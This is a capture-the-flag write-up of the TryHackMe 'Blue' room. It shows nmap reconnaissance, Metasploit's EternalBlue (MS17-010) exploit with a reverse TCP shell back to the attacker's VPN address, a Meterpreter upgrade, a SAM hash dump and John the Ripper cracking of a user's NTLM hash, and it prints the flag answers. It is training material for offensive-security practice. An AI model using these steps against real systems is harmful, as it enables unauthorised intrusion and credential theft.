# Blue — TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** Blue  
**Difficulty:** Easy  
**Author:** Anthony Lee Carrera Molina  
**Date:** November 2026  
**Status:** Completed — 3/3 flags

---

## Summary

In this room I compromised a Windows Server 2012 R2 machine by exploiting EternalBlue (MS17-010), a critical SMBv1 vulnerability that allows unauthenticated remote code execution. The exploit gave direct SYSTEM-level access with no privilege escalation required. From there I dumped password hashes from the SAM database and cracked them offline to recover plaintext credentials.

**Attack chain:** Recon → SMB enumeration → MS17-010 confirmed → EternalBlue exploit → SYSTEM shell → Shell upgrade to Meterpreter → SAM hash dump → NTLM cracking → Flags

---

## Flags

| Flag | Value |
|------|-------|
| flag1.txt | `flag{access_the_machine}` |
| flag2.txt | `flag{sam_database_elevated_access}` |
| flag3.txt | `flag{admin_documents_can_be_valuable}` |

---

## Reconnaissance

### Nmap — Port Scan

```bash
sudo nmap -sCV --min-rate 1000 -p- 10.112.170.216 -oN nmap.txt
```

**Relevant open ports:**

| Port | Service | Version |
|------|---------|---------|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | Windows Server 2012 R2 Datacenter |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Service (RDP) |
| 5985/tcp | http | Microsoft HTTPAPI 2.0 (WinRM) |

**Key finding from nmap scripts:**
```
smb-security-mode:
  message_signing: disabled (dangerous, but default)
```

SMB signing disabled is a misconfiguration that enables relay attacks. Combined with an open port 445 on a Windows host, this immediately points toward SMB exploitation.

---

## Vulnerability Confirmation

### MS17-010 (EternalBlue) Check

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.112.170.216
```

**Result:**
```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

The target is missing patch KB4012212 and is vulnerable to CVE-2017-0143 — the EternalBlue exploit that was used in the WannaCry ransomware attack of 2017.

---

## Exploitation — EternalBlue (MS17-010)

### Metasploit Setup

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.112.170.216
set LHOST 192.168.135.198   # tun0 — TryHackMe VPN interface
set payload windows/x64/shell/reverse_tcp
run
```

**Result:**
```
[+] 10.112.170.216:445 - The target is vulnerable.
[*] Command shell session 1 opened (192.168.135.198:4444 -> 10.112.170.216:49207)

Microsoft Windows [Version 6.3.9600]
C:\Windows\system32> whoami
nt authority\system
```

Direct SYSTEM access — no privilege escalation needed. EternalBlue exploits a memory corruption bug in SMBv1 that allows arbitrary code execution as SYSTEM.

---

## Shell Upgrade — Shell to Meterpreter

A basic shell is limited. Upgrading to Meterpreter provides a richer feature set (file search, hash dumping, pivoting).

Background the current shell with **Ctrl+Z**, then:

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 192.168.135.198
run
```

```bash
sessions -i 3   # interact with the new meterpreter session
getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## Flag Capture

### Flag 1 — C:\

```bash
type C:\flag1.txt
# flag{access_the_machine}
```

### Flag 2 — SAM config directory

```bash
search -f flag2.txt
# c:\Windows\System32\config\flag2.txt

cat c:\\Windows\\System32\\config\\flag2.txt
# flag{sam_database_elevated_access}
```

### Flag 3 — Jon's Documents

```bash
type C:\Users\Jon\Documents\flag3.txt
# flag{admin_documents_can_be_valuable}
```

---

## Post-Exploitation — Password Hash Dump

```bash
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The format is `username:RID:LM_hash:NTLM_hash`. The LM hash `aad3b435b51404eeaad3b435b51404ee` is the standard empty LM hash (LM authentication disabled). The NTLM hash for Jon is `ffb43f0de35be4d9917ac0cc8ad57f8d`.

### Cracking with John the Ripper

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=NT hash.txt
# Jon:alqfna22
```

> **Note:** Windows uses NTLM hashing, not MD5. The `--format=NT` flag targets NTLM hashes specifically.

**Result:** Jon's password is `alqfna22`.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Reconnaissance | Active Scanning | T1595 | Nmap port and service scan |
| Discovery | Network Service Discovery | T1046 | SMB vulnerability check with nmap script |
| Initial Access | Exploit Public-Facing Application | T1190 | EternalBlue MS17-010 RCE via SMBv1 |
| Execution | Exploitation for Client Execution | T1203 | Remote code execution as SYSTEM |
| Privilege Escalation | — | — | Not required — direct SYSTEM access |
| Defense Evasion | Process Injection | T1055 | Meterpreter stage injected into process |
| Credential Access | OS Credential Dumping: SAM | T1003.002 | hashdump retrieved NTLM hashes from SAM |
| Credential Access | Brute Force: Password Cracking | T1110.002 | John the Ripper cracked NTLM hash |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and SMB vulnerability detection |
| Metasploit (ms17_010_eternalblue) | EternalBlue exploit |
| Metasploit (shell_to_meterpreter) | Shell upgrade to Meterpreter |
| Meterpreter (hashdump) | SAM database credential extraction |
| John the Ripper | NTLM hash cracking |

---

## Key Takeaways

- **EternalBlue (MS17-010)** is a critical unpatched SMBv1 vulnerability that grants SYSTEM access with no credentials. Any Windows machine with SMB signing disabled and port 445 exposed should be checked for this.
- **SMB signing disabled** is a flag during recon — it signals potential relay and exploitation opportunities.
- **NTLM vs MD5**: Windows stores passwords as NTLM hashes, not MD5. Using the wrong format in John the Ripper will produce no results.
- **hashdump** requires SYSTEM privileges — another reason why landing as SYSTEM from the start matters.
- **Shell → Meterpreter upgrade** dramatically expands post-exploitation capabilities (search, hashdump, pivoting) compared to a basic cmd shell.

---

*Writeup by Anthony Lee Carrera Molina | github.com/anthony-offensive/offensive-security-portfolio*
